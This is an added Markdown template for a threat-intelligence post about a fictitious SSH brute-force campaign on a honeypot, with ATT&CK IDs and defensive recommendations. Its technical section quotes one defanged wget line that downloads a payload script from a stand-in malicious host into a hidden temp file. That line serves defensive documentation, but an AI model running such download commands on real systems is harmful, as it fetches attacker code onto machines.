@@ -1,0 +1,61 @@
+---
+title: "Example: SSH brute-force campaign observed on a honeypot"
+description: "Template for campaign posts, with fictitious data from documentation ranges. Copy it, replace the data and remove draft before publishing."
+lang: en
+translationKey: exemplo-honeypot-ssh
+pubDate: 2026-10-04
+type: campaign
+campaign: 2026-10-exemplo-honeypot-ssh
+tlp: CLEAR
+tags: [honeypot, ssh, brute-force]
+attack: [T1110, T1021.004]
+draft: true
+---
+
+> **Example only.** Every value below is fictitious (RFC 5737 documentation IPs and the `.test`
+> TLD). This post is a draft, so it never reaches production; it shows the structure every
+> campaign post must follow.
+
+## Executive summary
+
+Between 2026-09-01 and 2026-09-28 a personal SSH honeypot recorded a password-guessing
+campaign from two addresses, followed by an attempt to download a shell script from
+<Defang value="exemplo-malicioso.test" />. Defenders should block the listed indicators and
+alert on repeated SSH authentication failures followed by a successful login.
+
+## Timeline
+
+| Date (UTC) | Event |
+| --- | --- |
+| 2026-09-02 | First authentication attempts from <Defang value="203.0.113.10" /> |
+| 2026-09-05 | Download attempt of `payload.sh` |
+| 2026-09-28 | Last observed activity |
+
+## Technical analysis
+
+Describe what was observed, how, and with what level of confidence. Keep IoCs defanged in the
+text, including code blocks:
+
+```bash
+# Defanged on purpose: the raw values only live in the CSV/STIX files.
+wget hxxp://exemplo-malicioso[.]test/payload.sh -O /tmp/.x
+```
+
+## MITRE ATT&CK
+
+<AttackTable ids={['T1110', 'T1021.004']} />
+
+## Indicators of compromise
+
+<CampaignIocs id="2026-10-exemplo-honeypot-ssh" />
+
+## Detections
+
+Link the rules published in the detections repository (Sigma, YARA, Suricata) and explain
+what each one catches and its expected false positives.
+
+## Recommendations
+
+- Disable password authentication for SSH and require keys.
+- Rate-limit or block repeated authentication failures.
+- Hunt for the listed indicators in proxy and DNS logs.
